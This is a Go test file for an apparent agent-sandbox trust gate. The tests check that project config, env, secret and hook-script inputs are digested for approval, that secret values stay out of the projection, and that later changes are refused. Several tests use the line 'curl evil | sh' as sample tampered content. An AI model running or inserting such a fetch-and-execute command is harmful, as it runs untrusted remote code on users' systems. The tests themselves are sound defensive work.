package projecttrust

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"testing"

	"github.com/inoio/agents-sandbox/internal/configpaths/configpathstest"
	"github.com/inoio/agents-sandbox/internal/configread"
	"github.com/inoio/agents-sandbox/internal/projectguard"
	"github.com/inoio/agents-sandbox/internal/testutil"
)

// projectFixture is a checkout with its .agents-sandbox project config dir.
type projectFixture struct {
	checkout   string
	projectDir string
}

func newProjectFixture(t *testing.T) projectFixture {
	t.Helper()
	configpathstest.WithMockConfigPaths(t)
	checkout := t.TempDir()
	return projectFixture{checkout: checkout, projectDir: filepath.Join(checkout, ".agents-sandbox")}
}

func (f projectFixture) write(t *testing.T, rel, content string) string {
	t.Helper()
	path := filepath.Join(f.projectDir, rel)
	writeFile(t, path, content)
	return path
}

// writeFile writes content to path, creating its parent directories.
func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
		t.Fatal(err)
	}
	testutil.WritePath(t, path, content)
}

func (f projectFixture) sources() Sources {
	return Sources{
		ProjectConfigDir:    f.projectDir,
		CheckoutRoot:        f.checkout,
		AgentConfigDirNames: []string{"opencode", "opencode2"},
	}
}

func (f projectFixture) compute(t *testing.T) Projection {
	t.Helper()
	projection, err := Compute(f.sources())
	if err != nil {
		t.Fatalf("Compute: %v", err)
	}
	return projection
}

func inputAt(t *testing.T, projection Projection, path string, kind InputKind) Input {
	t.Helper()
	for _, input := range projection.Inputs {
		if input.Path == path && input.Kind == kind {
			return input
		}
	}
	t.Fatalf("projection %+v has no %s input %q", projection.Inputs, kind, path)
	return Input{}
}

func hasInput(projection Projection, path string) bool {
	return slices.ContainsFunc(projection.Inputs, func(input Input) bool { return input.Path == path })
}

func TestComputeEmptyProjectLayer(t *testing.T) {
	f := newProjectFixture(t)
	if got := f.compute(t); !got.Empty() {
		t.Errorf("Compute(no project dir) = %+v, want empty", got)
	}
	if err := os.MkdirAll(f.projectDir, 0o750); err != nil {
		t.Fatal(err)
	}
	if got := f.compute(t); !got.Empty() {
		t.Errorf("Compute(empty project dir) = %+v, want empty", got)
	}
}

// TestComputeWithoutAProjectConfigDirReadsNothing pins that an excluded layer
// reads nothing, not the current directory's files.
func TestComputeWithoutAProjectConfigDirReadsNothing(t *testing.T) {
	configpathstest.WithMockConfigPaths(t)
	cwd := t.TempDir()
	writeFile(t, filepath.Join(cwd, "env"), "A=1\n")
	writeFile(t, filepath.Join(cwd, "Dockerfile"), "FROM base\n")
	t.Chdir(cwd)
	if got, err := Compute(Sources{}); err != nil || !got.Empty() {
		t.Errorf("Compute(no project config dir) = %+v, %v; want empty", got, err)
	}
}

// TestComputeLauncherConfigIsOneEntryPerKey pins the launcher config effect:
// every key the file sets, flattened and sorted, with a canonical value, so a
// reorder or reformat keeps the digest while any value change alters it.
func TestComputeLauncherConfigIsOneEntryPerKey(t *testing.T) {
	f := newProjectFixture(t)
	path := f.write(t, "config.yaml", "network:\n  profile: public\nmemory: 8G\nmounts:\n  /host: /\n")
	got := inputAt(t, f.compute(t), path, KindLauncherConfig)
	want := []string{`memory: "8G"`, `mounts./host: "/"`, `network.profile: "public"`}
	if !slices.Equal(got.Entries, want) {
		t.Errorf("config entries = %q, want %q", got.Entries, want)
	}

	before := f.compute(t).Digest()
	f.write(t, "config.yaml", "memory: '8G'   # same values\nmounts: {/host: /}\nnetwork: {profile: public}\n")
	if after := f.compute(t).Digest(); after != before {
		t.Error("a reformatted config with the same values changed the digest")
	}
	f.write(t, "config.yaml", "memory: 16G\nmounts: {/host: /}\nnetwork: {profile: public}\n")
	if after := f.compute(t).Digest(); after == before {
		t.Error("a changed config value kept the digest")
	}
}

// TestComputeHomeManifestKeepsTheKeysCase pins that the home: entries are
// projected as home provisioning parses them: a case-only change to a key it
// reads, which the lowercased config keys cannot tell apart, changes the digest.
func TestComputeHomeManifestKeepsTheKeysCase(t *testing.T) {
	f := newProjectFixture(t)
	path := f.write(t, "config.yaml", "home:\n  bin/hook.sh: {source: hook.sh, hook: startup, Root: true}\n")
	got := inputAt(t, f.compute(t), path, KindHomeManifest)
	if !slices.Equal(got.Entries, []string{`bin/hook.sh ← "hook.sh" hook="startup" root=false`}) {
		t.Errorf("home entries = %q", got.Entries)
	}
	before := f.compute(t).Digest()
	f.write(t, "config.yaml", "home:\n  bin/hook.sh: {source: hook.sh, hook: startup, root: true}\n")
	if f.compute(t).Digest() == before {
		t.Error("a case-only change that makes the hook run as root kept the digest")
	}
}

// TestComputeConfigFileIsOneInputPerRoleItContributes pins F5: a config file
// without home: keys projects once, as launcher config — the empty home
// manifest must not add a second input, or the first-run change list and the
// flat config paths warning list the file twice. A config file with home:
// entries stays one input per role, each with its effect.
func TestComputeConfigFileIsOneInputPerRoleItContributes(t *testing.T) {
	f := newProjectFixture(t)
	path := f.write(t, "config.yaml", "memory: 8G\n")
	projection := f.compute(t)
	if got := inputAt(t, projection, path, KindLauncherConfig); !slices.Equal(got.Entries, []string{`memory: "8G"`}) {
		t.Errorf("launcher config entries = %q, want the settings", got.Entries)
	}
	for _, input := range projection.Inputs {
		if input.Path == path && input.Kind == KindHomeManifest {
			t.Errorf("a config file without home: keys projected an empty home manifest input: %+v", input)
		}
	}
	if len(projection.Inputs) != 1 {
		t.Errorf("projection = %+v, want only the launcher config input", projection.Inputs)
	}

	f.write(t, "config.yaml", "memory: 8G\nhome:\n  .profile: {source: dotfiles/profile, hook: startup}\n")
	projection = f.compute(t)
	inputAt(t, projection, path, KindHomeManifest)
	inputAt(t, projection, path, KindLauncherConfig)
}

func TestComputeEnvFileIsItsVariables(t *testing.T) {
	f := newProjectFixture(t)
	path := f.write(t, "env", "# comment\nB=2\nA=1\n")
	got := inputAt(t, f.compute(t), path, KindEnv)
	if !slices.Equal(got.Entries, []string{"A=1", "B=2"}) {
		t.Errorf("env entries = %q, want the sorted variables", got.Entries)
	}
}

func TestComputeSkipsAnEnvPathThatIsNoFile(t *testing.T) {
	f := newProjectFixture(t)
	if err := os.MkdirAll(filepath.Join(f.projectDir, "env"), 0o750); err != nil {
		t.Fatal(err)
	}
	if got := f.compute(t); hasInput(got, filepath.Join(f.projectDir, "env")) {
		t.Errorf("a directory named env became an input: %+v", got.Inputs)
	}
}

// TestComputeSecretFilesAreStructureOnly pins that a secret's hosts and scope
// are gated while its value never reaches the projection.
func TestComputeSecretFilesAreStructureOnly(t *testing.T) {
	f := newProjectFixture(t)
	legacy := f.write(t, "env.secret", "GH_TOKEN=ghp_legacyvalue@api.github.com\nBROKEN=nohostvalue\n")
	yamlFile := f.write(
		t,
		"env.secret.yaml",
		"API_KEY:\n  value: sk_yamlvalue\n  hosts: [b.example.com, a.example.com]\n  header_fields: [x-key, authorization]\n"+
			"ANY:\n  value: anyvalue\n  allow_any_host_dangerous: true\n"+
			"ONE:\n  value: onevalue\n  host: one.example.com\n  header_fields: [authorization]\n"+
			"PLAIN:\n  value: plainvalue\n",
	)
	projection := f.compute(t)

	if got := inputAt(
		t,
		projection,
		legacy,
		KindSecrets,
	); !slices.Equal(
		got.Entries,
		[]string{"GH_TOKEN: hosts api.github.com"},
	) {
		t.Errorf("legacy secret entries = %q", got.Entries)
	}
	want := []string{
		"ANY: any host (dangerous)",
		"API_KEY: hosts a.example.com, b.example.com; header fields authorization, x-key",
		"ONE: hosts one.example.com; header fields authorization",
		"PLAIN",
	}
	if got := inputAt(t, projection, yamlFile, KindSecrets); !slices.Equal(got.Entries, want) {
		t.Errorf("yaml secret entries = %q, want %q", got.Entries, want)
	}
	assertNoSecretValues(
		t,
		projection,
		"ghp_legacyvalue",
		"nohostvalue",
		"sk_yamlvalue",
		"anyvalue",
		"onevalue",
		"plainvalue",
	)
}

func assertNoSecretValues(t *testing.T, projection Projection, values ...string) {
	t.Helper()
	for _, input := range projection.Inputs {
		for _, entry := range input.Entries {
			for _, value := range values {
				if strings.Contains(entry, value) {
					t.Fatalf("entry %q of %s leaks the secret value", entry, input.Path)
				}
			}
		}
	}
}

func TestComputeFileInputsAreTheirContent(t *testing.T) {
	f := newProjectFixture(t)
	dockerfile := f.write(t, "Dockerfile", "FROM base\nRUN make\n")
	snippet := f.write(t, "opencode/opencode.json", "{\"model\":\"x\"}\n")
	plugin := f.write(t, "opencode2/plugin/a.ts", "export {}\n")
	stray := f.write(t, "README.md", "not consumed\n")
	projection := f.compute(t)

	for _, tc := range []struct {
		path string
		want []string
	}{
		{dockerfile, []string{"FROM base", "RUN make"}},
		{snippet, []string{`{"model":"x"}`}},
		{plugin, []string{"export {}"}},
	} {
		if got := inputAt(t, projection, tc.path, KindFile); !slices.Equal(got.Entries, tc.want) {
			t.Errorf("input %s = %q, want content %q", tc.path, got.Entries, tc.want)
		}
	}
	if hasInput(projection, stray) {
		t.Errorf("a file the launcher does not consume was gated: %s", stray)
	}
}

// TestComputeFileContentKeepsEveryByte pins that content differing only in the
// final newline, or an empty file against a lone newline, is a change.
func TestComputeFileContentKeepsEveryByte(t *testing.T) {
	f := newProjectFixture(t)
	path := filepath.Join(f.projectDir, "Dockerfile")
	digests := map[string]string{}
	for _, content := range []string{
		"FROM base", "FROM base\n", "", "\n", "FROM base\n" + noFinalNewline + "\n", "sha256:" + strings.Repeat("0", 64),
	} {
		writeFile(t, path, content)
		digests[f.compute(t).Digest()] = content
	}
	if len(digests) != 6 {
		t.Errorf("distinct contents shared a digest: %q", digests)
	}
	writeFile(t, path, "FROM base")
	if got := inputAt(
		t,
		f.compute(t),
		path,
		KindFile,
	); !slices.Equal(
		got.Entries,
		[]string{"FROM base", noFinalNewline},
	) {
		t.Errorf("entries = %q, want the missing final newline marked", got.Entries)
	}
}

// TestComputeLargeOrBinaryFilesAreADigest pins the display bound: a file up to
// it is shown line by line, a larger or binary one is a digest, and a file
// beyond any read bound is still gated rather than skipped.
func TestComputeLargeOrBinaryFilesAreADigest(t *testing.T) {
	f := newProjectFixture(t)
	atBound := f.write(t, "opencode/at.txt", strings.Repeat("x", 65536))
	large := f.write(t, "opencode/big.txt", strings.Repeat("x", 65537))
	binary := f.write(t, "opencode/bin.dat", "\xff\xfe\x00")
	dockerfile := f.write(t, "Dockerfile", strings.Repeat("RUN true\n", 3*65536))
	projection := f.compute(t)

	if got := inputAt(t, projection, atBound, KindFile); strings.HasPrefix(got.Entries[0], "sha256:") {
		t.Error("a file at the bound was shown as a digest")
	}
	for _, path := range []string{large, binary, dockerfile} {
		got := inputAt(t, projection, path, KindFile)
		if len(got.Entries) != 1 || !strings.HasPrefix(got.Entries[0], "sha256:") {
			t.Errorf("input %s = %d entries, want a single sha256 entry", path, len(got.Entries))
		}
	}
}

// TestComputeHomeSourcesAreGatedByTheirResolvedPath pins that a home: source
// the guest can write is gated by content however the entry spells it, and a
// host path outside the checkout adds no input beyond the config entry.
func TestComputeHomeSourcesAreGatedByTheirResolvedPath(t *testing.T) {
	f := newProjectFixture(t)
	hook := f.write(t, "github-auth.sh", "#!/bin/sh\necho hi\n")
	checkoutScript := filepath.Join(f.checkout, "scripts", "setup.sh")
	writeFile(t, checkoutScript, "make setup\n")
	checkoutDir := filepath.Join(f.checkout, "dotfiles")
	writeFile(t, filepath.Join(checkoutDir, "a.conf"), "a\n")
	outside := filepath.Join(t.TempDir(), "host.conf")
	writeFile(t, outside, "host\n")
	f.write(t, "config.yaml", "home:\n"+
		"  bin/auth.sh: {source: github-auth.sh, hook: startup}\n"+
		"  setup.sh: "+checkoutScript+"\n"+
		"  .dotfiles: "+checkoutDir+"\n"+
		"  .missing: missing.sh\n"+
		"  .host.conf: "+outside+"\n")
	projection := f.compute(t)

	for path, want := range map[string][]string{
		hook:           {"#!/bin/sh", "echo hi"},
		checkoutScript: {"make setup"},
	} {
		if got := inputAt(t, projection, path, KindFile); !slices.Equal(got.Entries, want) {
			t.Errorf("home source %s = %q, want content %q", path, got.Entries, want)
		}
	}
	if hasInput(projection, outside) {
		t.Errorf("a host path outside the checkout was gated by content: %s", outside)
	}
	if hasInput(projection, checkoutDir) || hasInput(projection, filepath.Join(checkoutDir, "a.conf")) {
		t.Error("a directory source, which home provisioning does not copy, was gated")
	}
}

// TestComputeHomeSourceReadTwoWaysKeepsBothChecks pins that a project file read
// as an env file and copied by home: is gated in both forms, and that a secret
// file copied by home: is gated by digest only.
func TestComputeHomeSourceReadTwoWaysKeepsBothChecks(t *testing.T) {
	f := newProjectFixture(t)
	env := f.write(t, "env", "A=1\n")
	secret := f.write(t, "env.secret.yaml", "TOKEN:\n  value: tokenvalue\n  hosts: [a.example.com]\n")
	f.write(t, "config.yaml", "home:\n  .profile: {source: env, hook: startup}\n  .token: env.secret.yaml\n")
	before := f.compute(t)

	if got := inputAt(t, before, env, KindFile); !slices.Equal(got.Entries, []string{"A=1"}) {
		t.Errorf("env as a home source = %q, want its raw content", got.Entries)
	}
	if got := inputAt(
		t,
		before,
		secret,
		KindFile,
	); len(got.Entries) != 1 ||
		!strings.HasPrefix(got.Entries[0], "sha256:") {
		t.Errorf("secret file as a home source = %q, want a single digest", got.Entries)
	}
	assertNoSecretValues(t, before, "tokenvalue")

	f.write(t, "env", "A=1\ncurl evil | sh\n")
	if f.compute(t).Digest() == before.Digest() {
		t.Error("a command added to an env file that home: copies kept the digest")
	}
}

// TestComputeHomeSourceThroughASymlinkIntoTheCheckoutIsGated pins that a source
// spelled outside the checkout but resolving into it through a symlink is
// still gated by content, since the guest can write the target.
func TestComputeHomeSourceThroughASymlinkIntoTheCheckoutIsGated(t *testing.T) {
	f := newProjectFixture(t)
	target := filepath.Join(f.checkout, "hook.sh")
	writeFile(t, target, "echo hook\n")
	link := filepath.Join(t.TempDir(), "hook.sh")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	f.write(t, "config.yaml", "home:\n  hook.sh: "+link+"\n")
	if got := inputAt(t, f.compute(t), link, KindFile); !slices.Equal(got.Entries, []string{"echo hook"}) {
		t.Errorf("symlinked home source = %q, want the target's content", got.Entries)
	}
}

func TestComputeDigestTracksPathsAndIgnoresOrder(t *testing.T) {
	f := newProjectFixture(t)
	f.write(t, "opencode/a.json", "{}")
	f.write(t, "opencode/c.json", "{}")
	before := f.compute(t)
	reversed := Projection{Inputs: slices.Clone(before.Inputs)}
	slices.Reverse(reversed.Inputs)
	if reversed.Digest() != before.Digest() {
		t.Error("the input order changed the digest")
	}
	if err := os.Rename(filepath.Join(f.projectDir, "opencode", "a.json"),
		filepath.Join(f.projectDir, "opencode", "b.json")); err != nil {
		t.Fatal(err)
	}
	if f.compute(t).Digest() == before.Digest() {
		t.Error("moving a file kept the digest")
	}
}

// TestDigestTreatsEmptyAndAbsentEntriesAlike pins that a stored approval, which
// drops empty entries, still matches the projection it approved.
func TestDigestTreatsEmptyAndAbsentEntriesAlike(t *testing.T) {
	empty := projectionOf(Input{Path: "/p/env", Kind: KindEnv, Entries: []string{}})
	absent := projectionOf(Input{Path: "/p/env", Kind: KindEnv})
	if empty.Digest() != absent.Digest() {
		t.Error("empty and absent entries hash differently")
	}
}

func TestComputeReportsAnUnparsableConfig(t *testing.T) {
	f := newProjectFixture(t)
	f.write(t, "config.json5", "{memory: [}")
	_, err := Compute(f.sources())
	if err == nil || !strings.Contains(err.Error(), "launcher config") {
		t.Errorf("Compute = %v, want the launcher config parse error", err)
	}
}

func TestComputeReportsAnInvalidHomeSection(t *testing.T) {
	f := newProjectFixture(t)
	f.write(t, "config.yaml", "home: [not, a, map]\n")
	if _, err := Compute(f.sources()); err == nil {
		t.Error("Compute accepted an invalid home: section")
	}
}

// TestComputeReportsAnUnreadableInput pins that a project input the gate
// cannot read is an error, never an absent input that would be approved.
func TestComputeReportsAnUnreadableInput(t *testing.T) {
	f := newProjectFixture(t)
	writeFile(t, f.projectDir, "not a directory\n")
	if _, err := Compute(f.sources()); !errors.Is(err, syscall.ENOTDIR) {
		t.Errorf("Compute = %v, want the read error", err)
	}
}

// TestComputeRejectsAnInputThatIsNoRegularFile pins that a project input
// pointing at a device is refused before it is read, so it can neither hang
// the gate nor exhaust memory.
func TestComputeRejectsAnInputThatIsNoRegularFile(t *testing.T) {
	for _, rel := range []string{"Dockerfile", "opencode/plugin.ts"} {
		t.Run(rel, func(t *testing.T) {
			f := newProjectFixture(t)
			link := filepath.Join(f.projectDir, rel)
			if err := os.MkdirAll(filepath.Dir(link), 0o750); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink("/dev/zero", link); err != nil {
				t.Fatal(err)
			}
			if _, err := Compute(f.sources()); !errors.Is(err, errNotRegularFile) {
				t.Errorf("Compute = %v, want errNotRegularFile", err)
			}
		})
	}
}

// TestComputeSkipsAHomeSourceThatIsNoRegularFile pins that a device home:
// source, which provisioning cannot copy, is skipped without being read.
func TestComputeSkipsAHomeSourceThatIsNoRegularFile(t *testing.T) {
	f := newProjectFixture(t)
	link := filepath.Join(f.checkout, "zero")
	if err := os.Symlink("/dev/zero", link); err != nil {
		t.Fatal(err)
	}
	config := f.write(t, "config.yaml", "home:\n  zero: "+link+"\n")
	got := f.compute(t)
	if len(got.Inputs) != 2 || hasInput(got, link) {
		t.Errorf("inputs = %+v, want only the config file's two inputs %s", got.Inputs, config)
	}
}

// failingFile is an fs.File whose Stat or Read fails.
type failingFile struct {
	statErr, readErr error
}

func (f failingFile) Stat() (fs.FileInfo, error) {
	if f.statErr != nil {
		return nil, f.statErr
	}
	return regularFileInfo{}, nil
}
func (f failingFile) Read([]byte) (int, error) { return 0, f.readErr }
func (failingFile) Close() error               { return nil }

type regularFileInfo struct{ fs.FileInfo }

func (regularFileInfo) Mode() fs.FileMode { return 0 }

// TestReadFileInputReportsAFailedStatOrRead pins that a failure after the open
// is an error, never a partial input.
func TestReadFileInputReportsAFailedStatOrRead(t *testing.T) {
	failure := errors.New("disk gone")
	for name, file := range map[string]failingFile{
		"stat": {statErr: failure},
		"read": {readErr: failure},
	} {
		t.Run(name, func(t *testing.T) {
			original := openInput
			openInput = func(string) (fs.File, error) { return file, nil }
			t.Cleanup(func() { openInput = original })
			if _, err := readFileInput("/p/Dockerfile"); !errors.Is(err, failure) {
				t.Errorf("readFileInput = %v, want the %s failure", err, name)
			}
		})
	}
}

// TestGuestWritableComparesSpelledAndResolvedPaths pins the root test: a path
// under a root matches as spelled or resolved, a root reached through a
// symlink matches its target's files, and nothing outside matches.
func TestGuestWritableComparesSpelledAndResolvedPaths(t *testing.T) {
	realRoot := t.TempDir()
	linkedRoot := filepath.Join(t.TempDir(), "checkout")
	if err := os.Symlink(realRoot, linkedRoot); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(realRoot, "a.sh"), "a\n")
	missingRoot := filepath.Join(t.TempDir(), "gone")

	for _, tc := range []struct {
		name  string
		path  string
		roots []string
		want  bool
	}{
		{"under a missing root as spelled", filepath.Join(missingRoot, "a.sh"), []string{"", missingRoot}, true},
		{"under a symlinked root", filepath.Join(realRoot, "a.sh"), []string{linkedRoot}, true},
		{"through a symlinked root", filepath.Join(linkedRoot, "a.sh"), []string{realRoot}, true},
		{"outside every root", "/elsewhere/a.sh", []string{"", missingRoot}, false},
		{"the root's parent", filepath.Dir(missingRoot), []string{missingRoot}, false},
		{"against a relative root", "/abs/a.sh", []string{"relative"}, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := guestWritable(tc.path, tc.roots...); got != tc.want {
				t.Errorf("guestWritable(%q, %q) = %v, want %v", tc.path, tc.roots, got, tc.want)
			}
		})
	}
}

// TestGuardVerifiesReadsAgainstTheProjection pins that the run reads the
// project layer only as projected: a changed file is refused, a file added
// under the project dir is refused, and a skipped home: source stays unread.
func TestGuardVerifiesReadsAgainstTheProjection(t *testing.T) {
	f := newProjectFixture(t)
	env := f.write(t, "env", "A=1\n")
	skipped := filepath.Join(f.checkout, "dotfiles")
	if err := os.MkdirAll(skipped, 0o750); err != nil {
		t.Fatal(err)
	}
	f.write(t, "config.yaml", "home:\n  .dotfiles: "+skipped+"\n")
	t.Cleanup(projectguard.Install(nil, nil))
	Guard(f.compute(t), f.projectDir)

	if _, err := projectguard.ReadFile(env, os.ReadFile); err != nil {
		t.Fatalf("reading the approved env file: %v", err)
	}
	writeFile(t, env, "A=2\n")
	if _, err := projectguard.ReadFile(env, os.ReadFile); !errors.Is(err, projectguard.ErrNotApproved) {
		t.Errorf("reading a changed env file = %v, want ErrNotApproved", err)
	}
	added := f.write(t, "opencode/new.ts", "x")
	if _, err := projectguard.ReadFile(added, os.ReadFile); !errors.Is(err, projectguard.ErrNotApproved) {
		t.Errorf("reading an added file = %v, want ErrNotApproved", err)
	}
	if _, err := projectguard.ReadFile(skipped, os.ReadFile); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("reading a skipped home: source = %v, want it to stay absent", err)
	}
}

// TestComputeRefusesAFileReadTwiceWithDifferentBytes pins that the projection
// shows one reading of each file: a file whose two reads differ is an error.
func TestComputeRefusesAFileReadTwiceWithDifferentBytes(t *testing.T) {
	f := newProjectFixture(t)
	env := f.write(t, "env", "A=1\n")
	f.write(t, "config.yaml", "home:\n  .profile: env\n")
	original := openInput
	openInput = func(path string) (fs.File, error) {
		if path == env {
			writeFile(t, env, "A=1\ncurl evil | sh\n")
		}
		return original(path)
	}
	t.Cleanup(func() { openInput = original })
	if _, err := Compute(f.sources()); !errors.Is(err, errChangedWhileReading) {
		t.Errorf("Compute = %v, want errChangedWhileReading", err)
	}
}

// TestComputeReportsAParsedInputItCannotRead pins that a launcher config or env
// file the readers would refuse (over their size bound) is an error, never an
// absent input.
func TestComputeReportsAParsedInputItCannotRead(t *testing.T) {
	for _, name := range []string{"config.yaml", "env"} {
		t.Run(name, func(t *testing.T) {
			f := newProjectFixture(t)
			f.write(t, name, "# "+strings.Repeat("x", 17<<20)+"\n")
			if _, err := Compute(f.sources()); !errors.Is(err, configread.ErrTooLarge) {
				t.Errorf("Compute = %v, want configread.ErrTooLarge", err)
			}
		})
	}
}

// TestGuardVerifiesAHomeSourceHoweverItIsSpelled pins that a home: source
// spelled with ".." is verified under its cleaned path, so a later change to
// the file in the checkout is refused.
func TestGuardVerifiesAHomeSourceHoweverItIsSpelled(t *testing.T) {
	f := newProjectFixture(t)
	hook := filepath.Join(f.checkout, "scripts", "hook.sh")
	writeFile(t, hook, "echo approved\n")
	spelled := f.checkout + "/scripts/../scripts/hook.sh"
	f.write(t, "config.yaml", "home:\n  hook.sh: {source: "+spelled+", hook: startup}\n")
	t.Cleanup(projectguard.Install(nil, nil))
	Guard(f.compute(t), f.projectDir)
	writeFile(t, hook, "curl evil | sh\n")
	if _, err := projectguard.ReadFile(hook, os.ReadFile); !errors.Is(err, projectguard.ErrNotApproved) {
		t.Errorf("reading the changed hook = %v, want ErrNotApproved", err)
	}
}
